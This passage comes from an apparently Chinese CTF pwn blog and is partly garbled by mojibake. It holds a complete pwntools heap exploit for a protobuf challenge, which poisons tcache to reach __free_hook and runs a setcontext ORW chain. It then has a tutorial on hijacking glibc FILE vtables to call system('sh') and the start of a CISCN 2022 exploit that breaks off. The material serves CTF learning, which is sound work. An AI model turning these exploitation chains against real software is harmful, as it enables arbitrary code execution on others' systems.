jboss-cli">protoc <span class="hljs-params">--python_out=</span><span class="hljs-string">./</span> p0ach1l.proto<br></code></pre></td></tr></table></figure><p>libcç‰ˆæœ¬æ˜¯2.31_9.9çš„setcontextæ‰“ORWï¼Œå‚è€ƒä»¥å‰åšå®¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> p0ach1l_pb2<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./bot&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28200&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * main</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;libc-2.31.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    msg = p0ach1l_pb2.devicemsg()       <span class="hljs-comment"># ç”Ÿæˆå¯¹è±¡</span><br>    msg.actionid = <span class="hljs-number">1</span><br>    msg.msgidx = index<br>    msg.msgsize = size<br>    msg.msgcontent = content<br>    p.sendafter(<span class="hljs-string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>, msg.SerializeToString())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    msg = p0ach1l_pb2.devicemsg()<br>    msg.actionid = <span class="hljs-number">2</span><br>    msg.msgidx = index<br>    msg.msgsize = <span class="hljs-built_in">len</span>(content)<br>    msg.msgcontent = content<br>    p.sendafter(<span class="hljs-string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>, msg.SerializeToString())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    msg = p0ach1l_pb2.devicemsg()<br>    msg.actionid = <span class="hljs-number">3</span><br>    msg.msgidx = index<br>    msg.msgsize = <span class="hljs-number">7</span><br>    msg.msgcontent = <span class="hljs-string">b&#x27;useless&#x27;</span><br>    p.sendafter(<span class="hljs-string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>, msg.SerializeToString())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    msg = p0ach1l_pb2.devicemsg()<br>    msg.actionid = <span class="hljs-number">4</span><br>    msg.msgidx = index<br>    msg.msgsize = <span class="hljs-number">7</span><br>    msg.msgcontent = <span class="hljs-string">b&#x27;useless&#x27;</span><br>    p.sendafter(<span class="hljs-string">b&#x27;now: &#x27;</span>, msg.SerializeToString())<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>) :<br>    add(i , <span class="hljs-number">0xf0</span> , <span class="hljs-string">b&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>) :<br>    free(i)<br><br>show(<span class="hljs-number">7</span>)<br>main_arean = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>libc_base = main_arean - <span class="hljs-number">0x1ecb80</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">8</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x10</span><br><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br>magic_gadget = libc_base + <span class="hljs-number">0x0000000000151990</span><br><br>add(<span class="hljs-number">8</span> , <span class="hljs-number">0x20</span> , <span class="hljs-string">b&#x27;&#x27;</span>)<br>add(<span class="hljs-number">9</span> , <span class="hljs-number">0x20</span> , <span class="hljs-string">b&#x27;&#x27;</span>)<br>free(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">9</span>)<br>edit(<span class="hljs-number">9</span> , p64(free_hook))<br>add(<span class="hljs-number">10</span> , <span class="hljs-number">0x20</span> , <span class="hljs-string">b&#x27;&#x27;</span>)<br>add(<span class="hljs-number">11</span> , <span class="hljs-number">0x20</span> , p64(magic_gadget))<br><br><br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000023b6a</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002601f</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x0000000000119211</span><br>pop_rax = libc_base + <span class="hljs-number">0x0000000000036174</span><br>syscall = read_addr + <span class="hljs-number">16</span><br>ret = libc_base + <span class="hljs-number">0x0000000000022679</span><br><br>rdx = heap_base + <span class="hljs-number">0xad0</span><br>orw = heap_base + <span class="hljs-number">0x980</span><br>flag = heap_base + <span class="hljs-number">0xad0</span><br>flag_addr = heap_base + <span class="hljs-number">0x100</span><br><br><span class="hljs-comment">#open</span><br>orwcode = p64(pop_rdi) + p64(flag)<br>orwcode += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>orwcode += p64(pop_rax) + p64(<span class="hljs-number">2</span>)<br>orwcode += p64(syscall)<br><br><span class="hljs-comment">#read</span><br>orwcode += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>orwcode += p64(pop_rsi) + p64(flag_addr)<br>orwcode += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>orwcode += p64(read_addr)<br><br><span class="hljs-comment">#wride</span><br>orwcode += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>orwcode += p64(pop_rsi) + p64(flag_addr)<br>orwcode += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>orwcode += p64(write_addr) <br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(orwcode)))<br><br>payload = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> + p64(rdx)<br>payload = payload.ljust(<span class="hljs-number">0x20</span>) + p64(setcontext)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(orw) + p64(ret)<br>add(<span class="hljs-number">12</span> , <span class="hljs-number">0xf0</span> , payload)<br>add(<span class="hljs-number">13</span> , <span class="hljs-number">0xf0</span> , orwcode)<br><br>pause()<br>free(<span class="hljs-number">12</span>)<br>lss(<span class="hljs-string">&quot;setcontext&quot;</span>)<br>lss(<span class="hljs-string">&quot;syscall&quot;</span>)<br>lss(<span class="hljs-string">&quot;magic_gadget&quot;</span>)<br>lss(<span class="hljs-string">&#x27;open_addr&#x27;</span>)<br>lss(<span class="hljs-string">&quot;read_addr&quot;</span>)<br>lss(<span class="hljs-string">&quot;write_addr&quot;</span>)<br>lss(<span class="hljs-string">&quot;free_hook&quot;</span>)<br>lss(<span class="hljs-string">&quot;heap_base&quot;</span>)<br>lss(<span class="hljs-string">&quot;libc_base&quot;</span>)<br>lss(<span class="hljs-string">&quot;main_arean&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ‚è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>protobuf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IOç³»ç±»ä¹‹ä¼ªé€ vtable</title>
    <link href="/2024/12/07/IO%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BC%AA%E9%80%A0vtable/"/>
    <url>/2024/12/07/IO%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BC%AA%E9%80%A0vtable/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¼ªé€ -vtable-åŠ«æŒç¨‹åºæµç¨‹"><a href="#ä¼ªé€ -vtable-åŠ«æŒç¨‹åºæµç¨‹" class="headerlink" title="ä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹"></a>ä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹</h1><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>å‰é¢æˆ‘ä»¬ç®€ç»äº†linuxä¸­æ–‡ä»¶æµçš„ç‰¹æ€§å’Œæ•°æ®ç»“æ„ï¼Œå°¤å…¶æ˜¯_IO_FILE_plus ç»“æ„ä¸­å­˜åœ¨ vtableï¼Œä¸€äº›å‡½æ•°ä¼šå–å‡º vtable ä¸­çš„æŒ‡é’ˆè¿›è¡Œè°ƒç”¨ã€‚</p><p>å› æ­¤ä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹çš„ä¸­å¿ƒæ€æƒ³å°±æ˜¯é’ˆå¯¹_IO_FILE_plus çš„ vtable åŠ¨æ‰‹è„šï¼Œé€šè¿‡æŠŠ vtable æŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„å†…å­˜ï¼Œå¹¶åœ¨å…¶ä¸­å¸ƒç½®å‡½æ•°æŒ‡é’ˆæ¥å®ç°ã€‚</p><p>å› æ­¤ vtable åŠ«æŒåˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯ç›´æ¥æ”¹å†™ vtable ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡ä»»æ„åœ°å€å†™å°±å¯ä»¥å®ç°ã€‚å¦ä¸€ç§æ˜¯è¦†ç›– vtable çš„æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„å†…å­˜ï¼Œç„¶ååœ¨å…¶ä¸­å¸ƒç½®å‡½æ•°æŒ‡é’ˆã€‚</p><h2 id="å®æ“"><a href="#å®æ“" class="headerlink" title="å®æ“"></a>å®æ“</h2><p>è¿™é‡Œæ¼”ç¤ºäº†ä¿®æ”¹ vtable ä¸­çš„æŒ‡é’ˆï¼Œé¦–å…ˆéœ€è¦çŸ¥é“_IO_FILE_plus ä½äºå“ªé‡Œï¼Œå¯¹äº fopen çš„æƒ…å†µä¸‹æ˜¯ä½äºå †å†…å­˜ï¼Œå¯¹äº stdin\stdout\stderr æ˜¯ä½äº libc.so ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_ptr;<br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    vtable_ptr=*(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//get vtable</span><br><br>    vtable_ptr[<span class="hljs-number">7</span>]=<span class="hljs-number">0x41414141</span> <span class="hljs-comment">//xsputn</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call 0x41414141&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¹æ® vtable åœ¨_IO_FILE_plus çš„åç§»å¾—åˆ° vtable çš„åœ°å€ï¼Œåœ¨ 64 ä½ç³»ç»Ÿä¸‹åç§»æ˜¯ 0xd8ã€‚ä¹‹åéœ€è¦ææ¸…æ¥šæ¬²åŠ«æŒçš„ IO å‡½æ•°ä¼šè°ƒç”¨ vtable ä¸­çš„å“ªä¸ªå‡½æ•°ã€‚å…³äº IO å‡½æ•°è°ƒç”¨ vtable çš„æƒ…å†µå·²ç»åœ¨ FILE ç»“æ„ä»‹ç»ä¸€èŠ‚ç»™å‡ºäº†ï¼ŒçŸ¥é“äº† printf ä¼šè°ƒç”¨ vtable ä¸­çš„ xsputnï¼Œå¹¶ä¸” xsputn çš„æ˜¯ vtable ä¸­ç¬¬å…«é¡¹ä¹‹åå°±å¯ä»¥å†™å…¥è¿™ä¸ªæŒ‡é’ˆè¿›è¡ŒåŠ«æŒã€‚</p><p>å¹¶ä¸”åœ¨ xsputn ç­‰ vtable å‡½æ•°è¿›è¡Œè°ƒç”¨æ—¶ï¼Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å…¶å®æ˜¯å¯¹åº”çš„_IO_FILE_plus åœ°å€ã€‚æ¯”å¦‚è¿™ä¾‹å­è°ƒç”¨ printfï¼Œä¼ é€’ç»™ vtable çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯_IO_2_1_stdout_çš„åœ°å€ã€‚</p><p>åˆ©ç”¨è¿™ç‚¹å¯ä»¥å®ç°ç»™åŠ«æŒçš„ vtable å‡½æ•°ä¼ åƒï¼Œæ¯”å¦‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> system_ptr 0x7ffff7a52390;</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_ptr;<br>    fp=<span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    vtable_ptr=*(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp<span class="hljs-number">+0xd8</span>);     <span class="hljs-comment">//get vtable</span><br><br>    <span class="hljs-built_in">memcopy</span>(fp,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-number">3</span>);<br><br>    vtable_ptr[<span class="hljs-number">7</span>]=system_ptr <span class="hljs-comment">//xsputn</span><br><br><br>    <span class="hljs-built_in">fwrite</span>(<span class="hljs-string">&quot;hi&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,fp);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨ç›®å‰ libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œä½äº libc æ•°æ®æ®µçš„ vtable æ˜¯ä¸å¯ä»¥è¿›è¡Œå†™å…¥çš„ã€‚ä¸è¿‡ï¼Œé€šè¿‡åœ¨å¯æ§çš„å†…å­˜ä¸­ä¼ªé€  vtable çš„æ–¹æ³•ä¾ç„¶å¯ä»¥å®ç°åˆ©ç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> system_ptr 0x7ffff7a52390;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_addr,*fake_vtable;<br><br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    fake_vtable=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br><br>    vtable_addr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//vtable offset</span><br><br>    vtable_addr[<span class="hljs-number">0</span>]=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fake_vtable;<br><br>    <span class="hljs-built_in">memcpy</span>(fp,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-number">3</span>);<br><br>    fake_vtable[<span class="hljs-number">7</span>]=system_ptr; <span class="hljs-comment">//xsputn</span><br><br>    fwrite(<span class="hljs-string">&quot;hi&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,fp);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬é¦–å…ˆåˆ†é…ä¸€æ¬¾å†…å­˜æ¥å­˜æ”¾ä¼ªé€ çš„ vtableï¼Œä¹‹åä¿®æ”¹_IO_FILE_plus çš„ vtable æŒ‡é’ˆæŒ‡å‘è¿™å—å†…å­˜ã€‚å› ä¸º vtable ä¸­çš„æŒ‡é’ˆæˆ‘ä»¬æ”¾ç½®çš„æ˜¯ system å‡½æ•°çš„åœ°å€ï¼Œå› æ­¤éœ€è¦ä¼ é€’å‚æ•° â€œ&#x2F;bin&#x2F;shâ€ æˆ– â€œshâ€ã€‚</p><p>å› ä¸º vtable ä¸­çš„å‡½æ•°è°ƒç”¨æ—¶ä¼šæŠŠå¯¹åº”çš„_IO_FILE_plus æŒ‡é’ˆä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬æŠŠ â€œshâ€ å†™å…¥_IO_FILE_plus å¤´éƒ¨ã€‚ä¹‹åå¯¹ fwrite çš„è°ƒç”¨å°±ä¼šç»è¿‡æˆ‘ä»¬ä¼ªé€ çš„ vtable æ‰§è¡Œ system(â€œshâ€)ã€‚</p><p>åŒæ ·ï¼Œå¦‚æœç¨‹åºä¸­ä¸å­˜åœ¨ fopen ç­‰å‡½æ•°åˆ›å»ºçš„_IO_FILE æ—¶ï¼Œä¹Ÿå¯ä»¥é€‰æ‹© stdin\stdout\stderr ç­‰ä½äº libc.so ä¸­çš„_IO_FILEï¼Œè¿™äº›æµåœ¨ printf\scanf ç­‰å‡½æ•°ä¸­å°±ä¼šè¢«ä½¿ç”¨åˆ°ã€‚åœ¨ libc2.23 ä¹‹å‰ï¼Œè¿™äº› vtable æ˜¯å¯ä»¥å†™å…¥å¹¶ä¸”ä¸å­˜åœ¨å…¶ä»–æ£€æµ‹çš„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">print</span> &amp;_IO_2_1_stdin_<br><span class="hljs-variable">$2</span> = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;<br><br>0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/<br></code></pre></td></tr></table></figure><h2 id="ä¾‹é¢˜â€”â€”-CISCN-2022-åä¸œåŒ—-duck"><a href="#ä¾‹é¢˜â€”â€”-CISCN-2022-åä¸œåŒ—-duck" class="headerlink" title="ä¾‹é¢˜â€”â€”[CISCN 2022 åä¸œåŒ—]duck"></a>ä¾‹é¢˜â€”â€”[CISCN 2022 åä¸œåŒ—]duck</h2><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/duck.rar">CISCN 2022 åä¸œåŒ—duck</a></p><h3 id="æ–¹æ³•ä¸€-â€”â€”-ä¿®æ”¹-IO-file-jumpsä¸­çš„-IO-new-file-overflow"><a href="#æ–¹æ³•ä¸€-â€”â€”-ä¿®æ”¹-IO-file-jumpsä¸­çš„-IO-new-file-overflow" class="headerlink" title="æ–¹æ³•ä¸€ â€”â€” ä¿®æ”¹_IO_file_jumpsä¸­çš„_IO_new_file_overflow"></a>æ–¹æ³•ä¸€ â€”â€” ä¿®æ”¹_IO_file_jumpsä¸­çš„_IO_new_file_overflow</h3><p>æ³¨æ„ï¼šåªèƒ½åŠ«æŒ_IO_file_jumpsï¼Œä¸èƒ½ç›´æ¥åŠ«æŒä¿®æ”¹_IO_new_file_overflow</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./pwn10&#x27;</span><br>url = <span 